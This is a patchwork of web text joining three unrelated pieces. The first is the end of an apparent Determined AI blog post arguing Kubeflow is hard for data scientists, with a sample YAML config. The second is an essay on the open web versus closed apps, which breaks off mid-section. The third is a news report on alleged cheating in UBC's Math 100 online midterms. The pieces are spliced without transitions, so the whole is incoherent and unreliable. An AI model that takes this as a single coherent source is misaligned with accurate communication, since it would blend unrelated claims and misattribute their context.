<p>If you look at some of the other components of Kubeflow, you’ll find similar philosophies: <strong>MPIJob, PyTorchJob, and Katib</strong> all expect data scientists to work with Kubernetes concepts and APIs. All of them suffer from the exact same usability issues — most data scientists don’t want to dive into the weeds of how Kubernetes is orchestrating the hardware, they just want an easier way to train their models. They want tools that abstract away foreign concepts and let them communicate ML concepts succinctly.</p>
<p>One fascinating thing about Kubeflow is that some of the components of Kubeflow have clearly figured this out! The best example is <strong>Kubeflow Pipelines</strong> — the core underlying technology of Kubeflow Pipelines is <strong><a href="https://github.com/argoproj/argo">Argo Workflows</a></strong> which are very similar to TFJob, providing a way to declare workflows in Kubernetes. <strong>Kubeflow Pipelines</strong> goes the crucial extra step of providing a Domain Specific Language that allows data scientists to write pipelines <em>in Python!</em> The builders of KFP realized that building containers and writing Kubernetes manifests wasn’t how data scientists wanted to interact with their work, so they <strong><em>abstracted away the k8s</em></strong> and made a tool that data scientists love.</p>
<p>Even parts of Kubeflow have realized that <strong>we can do better!</strong></p>

<p>Machine learning is exploding in popularity, and as it does ML tooling is frantically trying to keep up. Tools for everything you can imagine in ML are popping up: data versioning tools, experiment tracking tools, model serving tools, and yes even tools to help ML run on Kubernetes. However, the space is still young; although some projects are more popular than others there are no clear winners yet and nobody has yet to establish the perfect set of software to enable and accelerate ML.</p>
<p><em>What will the winners look like?</em> Some thoughts:</p>
<ul>
<li>ML tools should allow data scientists to <strong>accomplish more with less work</strong>. The number one opportunity for this is to separate the engineering work that data scientists are currently overwhelmed with from the science that they love.</li>
<li>We need <strong>abstractions</strong> that make it possible to perform high-performance data science on complex, modern infrastructure without needing to be a systems expert. Designing the right abstractions is not easy but it is crucially important to making modern ML more accessible, more convenient, and more cost-effective.</li>
<li><strong>Most data scientists aren’t unicorns</strong>. As such, avoid thinking about data scientists as software engineers and build tools that allow ML people to build, train, and deploy ML models without needing to become devops experts too. There are great tools out there that enable production grade ML without pushing that burden onto data scientists.</li>
</ul>
<p>These tenets are a long way of saying something we all know at this point, <strong>the best software has the best UX</strong>. The only additional advice is to make sure you actually <em>understand</em> the possible users of your software! Know what data scientists like and dislike about their current workflows, <em>enhance what they like and slice out what they don’t like!</em></p>
<h2 id="an-obvious-shill-for-determined">An Obvious Shill for Determined</h2>
<p>At Determined, we’ve worked with plenty of real-world deep learning scientists to understand their pain points and how they work today. Determined accomplishes many of the same goals as a tool like Kubeflow — allowing scientists to build and train deep learning models on Kubernetes (or any hardware, really), but without expecting data scientists to master countless new technologies along the way.</p>
<p>Compare a Determined configuration file to the TFJob configuration above:</p>
<div><div><pre><code>description: cifar10_pytorch
hyperparameters:
  learning_rate: 1e-4
  learning_rate_decay: 1e-6
  layer1_dropout: 0.25
  layer2_dropout: 0.25
  layer3_dropout: 0.5
  global_batch_size: 32
records_per_epoch: 50000
searcher:
  name: single
  metric: validation_error
  max_length:
    epochs: 32
entrypoint: model_def:CIFARTrial
</code></pre></div></div>
<p>This configuration accomplishes essentially the same goal — describing an ML training workflow. The big difference is that this configuration is <em>written in the language of data scientists</em>, with complicated infrastructure concepts abstracted away. We speak to users in terms they are comfortable with: hyperparameters, epochs, metrics, etc.</p>
<p>This means that our users can do more with less. Instead of having to learn Kubernetes or configure a cluster of machines to work with Horovod, they simply need to install Determined and describe experiments with their own terms. Determined unlocks incredibly powerful tools like <a href="https://determined.ai/blog/faster-nlp-with-deep-learning-distributed-training/">distributed training</a>, <a href="https://determined.ai/blog/why-does-no-one-use-advanced-hp-tuning/">hyperparameter search</a>, and experiment tracking, without placing extra burden on the user to understand what is happening behind the scenes. Determined has carefully built <a href="https://determined.ai/blog/standardized-models-with-determined/">powerful abstractions that allow data scientists to focus on science</a>, and not engineering, systems, and infrastructure.</p>
<p>Determined understands data scientists and enables them to accomplish more with less work. To see it in action, <a href="https://docs.determined.ai/latest/tutorials/quick-start.html">start with our quick start guide!</a> Determined is open source, so you can see how we do it in our <a href="https://github.com/determined-ai/determined">GitHub repository.</a></p>

Open web enthusiasts that are lamenting its demise, and regular users who are happy with their fast snappy apps and couldn't care less. </p><p>These groups have a hard time talking because the "open web" too often comes across as an idealistic abstract notion and most end users just don't tangibly feel the bad consequences. In fact, they're often happier with the snappy, vertically integrated experience of closed app ecosystems. </p><p>My goal here is to make it more palpable how everyday apps, searches and tools get worse when we let big centralized companies take over the web, and explore some paths for reversing it.</p><h2>What is the open web?</h2><p>Most definitions of the "open web" I've seen are either too technical to be accessible or too abstract to be usable and getting gridlocked in this debate often means watching from the sidelines while actual user welfare slowly diminishes.</p><p>Three characteristics that proponents of the open web will agree to in roughly descending order are:</p><ul><li><strong>Ease of publishing</strong>: anyone can publish to it freely or at least very cheaply, and is on the same footing with a globally accessible URL</li><li><strong>Ease of consuming</strong>: Net neutrality — ISP's dont cut deals with corporations to make some websites load faster or cheaper than others.</li><li><strong>Ease of remixing</strong>. You can see the source code. Content licenses and tools are permissive for derived works.</li></ul><h2>Detour: A framework to break down how people use the web</h2><p>I want to focus on the user experience point of view. To do this, I'm going to introduce a framework that divides up all our internet usage into two categories.</p><p><img src="https://landen.imgix.net/blog_uSsTzKptQlxlvUvQ/assets/xscGdbWOOPkGjdER.png" alt="Frame 1.png"></p><h3><strong>Unfamiliar problems</strong></h3><p>You have an unfamiliar problem and to solve it you either need to learn something new, or purchase goods or services to solve it</p><ul><li>e.g. taking out a mortgage, a health problem in the family, where to go to college, what skill to acquire next.</li><li>Unfamiliar problems are solved in large part with acquiring new knowledge, not just products or services.</li><li>These user journeys start with search engines — Google predominantly and **a lot of the time solving them is spent on web pages**.</li><li>When people are looking to solve unfamiliar problems, **revenue is typically higher-margin**, because users can't price the products and services as well.</li><li>These ultimately transition to being familiar problems.</li></ul><h3><strong>Familiar problems</strong></h3><ul><li>e.g. being entertained, keeping the dog food in stock,</li><li>These are best solved with apps like Email, Netflix, Twitter, DTC subscription boxes, etc.</li><li>Solving these needs has a very well defined user interaction journey. You open the app you're familiar with and follow its standard flow.</li><li>Revenue from people solving familiar problems is typically lower-margin and there's more competing products.
</li></ul><h3>How we're spending our time on familiar vs. unfamiliar problems</h3><p>Using time spent in apps vs mobile web on mobile is a way to proxy how we divide up our time.<strong> We spend most of our time on familiar problems but have a constant trickle of unfamiliar problems</strong>.</p><p><img src="https://landen.imgix.net/blog_uSsTzKptQlxlvUvQ/assets/cPuXkKFELALeIAkI.png" alt="Untitled (1).png"></p><h2>Unfamiliar problems are better solved with the open web</h2><p>Think about the last time you did some research, e.g. choosing a phone plan. You asked your friends, compared on forums, looked at the official sites, scribbled some notes and made a decision. Even if this journey was quick, you likely traversed a dozen services and products to do this.</p><p>Unfamiliar problems have less constraints, require creativity to solve, and thus are better suited to open solutions. Some other things that work for the open web here</p><ul><li>comparing alternatives is easier.</li><li>changing modalities (e.g. from reading to video) is easier.</li></ul><h2>Familiar problems stand to benefit more from tight vertical integration</h2><p>Take Spotify for example. It solves the very familiar problem of listening to music. Spotify just works better as an app because</p><ul><li>Controlling the user experience end to end makes for smoother flows.</li><li>Having all the user data kept with Spotify allows for better recommendation algorithms.</li><li>Spotify can easily hand off between devices.</li><li>It can run in the background</li></ul><p>Sure, the web can do a bunch of these things, but they're simply not first-class considerations in the open-read-close workflow that the browser was designed for.</p><h2>But the open web can be better for familiar problems too, especially for breaking monopolies</h2><p>Let's look at Amazon. Initially you start buying there because of their "always low prices" and the convenience of 2 day shipping. Over the years you keep shopping there, until you've forgotten that </p><ol><li>free 2 day shipping is now near universal</li><li>amazon isn't often the cheapest place</li></ol><p>On the Amazon app, you see the story around the product that best serves Amazon, not the buyer. Meanwhile, over on Insight you can use the web version and do all these things the app can't.</p><p><img src="https://landen.imgix.net/blog_uSsTzKptQlxlvUvQ/assets/ZEblynrLvBsutnlQ.png" alt="Screen Shot 2020-11-17 at 5.42.21 PM.png"></p><p>... and not just that

</p><p><img src="https://landen.imgix.net/blog_uSsTzKptQlxlvUvQ/assets/JVZoTRazmYPZXBQQ.png" alt="Screen Shot 2020-11-17 at 5.59.22 PM.png"></p><h2><strong>How solving unfamiliar problems gets harder too</strong></h2><p>Unfamiliar problems are solved in large part with acquiring new knowledge, not just products or services.

It was also circulated to students directly.</p>  <p>"I am extremely disappointed to tell you that there were over 100 cases of cheating," said the note, a screenshot of which was posted to the UBC Reddit&nbsp;thread.</p>  <p>"If confirmed, the students involved will receive a 0% for the course (not just the midterm) and I will recommend their expulsion from UBC."</p>  <p>The note is signed "Mike." The CBC has not been able to verify the UBC professor's identity. However,&nbsp;the university has said it's investigating allegations of widespread cheating&nbsp;in one section of the math department involving entry-level math students.</p>    <p>There are more than 1,500 students currently enrolled in Math 100 at UBC, split up into classes of about 250.&nbsp;The class is being held&nbsp;entirely online this semester, due to the pandemic. Midterms&nbsp;are&nbsp;run online as well.</p>  <p>Matthew Ramsey, director of university affairs, confirmed the university is investigating allegations of widespread cheating. He said it&nbsp;is&nbsp;too early to be able to provide details on how the students might have been cheating or how they were caught.</p>  <p>"Those details, I'm sure, will come clear in the investigative process," he said by phone on Tuesday.</p>  <p>Ramsey said the professor's note was first sent to students, then posted online.</p>  <h2>Test monitoring tools</h2>  <p>Many schools across the country, including UBC, <a href="https://www.cbc.ca/news/canada/ottawa/exam-surveillance-software-university-ottawa-1.5633134" target="_blank">have been using online software extensions</a>&nbsp;to help detect and discourage cheating since classes went virtual.&nbsp;One test-proctoring tool, called&nbsp;Proctorio, monitors students for suspicious behaviour while they're writing a virtual exam.</p>  <p>UBC faculty can&nbsp;offer an alternative, like a final project, to replace exams if they are overly concerned about cheating, but exams can't always be replaced.</p>  <p>"In&nbsp;some instances, it is necessary to use ...&nbsp;software like Proctorio to ensure academic integrity," Ramsey said.&nbsp;</p>  <p>"Incidents of academic misconduct themselves are very uncommon, very rare at the university," added Ramsey, who has been with the school since 2014.&nbsp;"I have not seen allegations of this nature in my time at UBC&nbsp;but, again, they are, at this point, allegations."</p>    <p>Investigations into academic misconduct&nbsp;begin&nbsp;with a professor reporting their concerns to the dean's office. That office can either dismiss&nbsp;complaints, give students a warning or pass the case along to the&nbsp;President's Advisory Committee on Student Discipline for potential punishment.&nbsp;</p>  <p>Penalties can range from a formal warning to being expelled from the university.</p>  <p>Since investigations are complex and take time, Ramsey said, it's&nbsp;too soon to gauge&nbsp;whether there has been an overall increase in cheating since classes and exams began moving fully&nbsp;online in the spring.</p>  <p>"If the students are disciplined, we will get a sense as to those numbers in the coming months. At this point, it's just too early to say," he said.</p></span></p></div></div>]]>
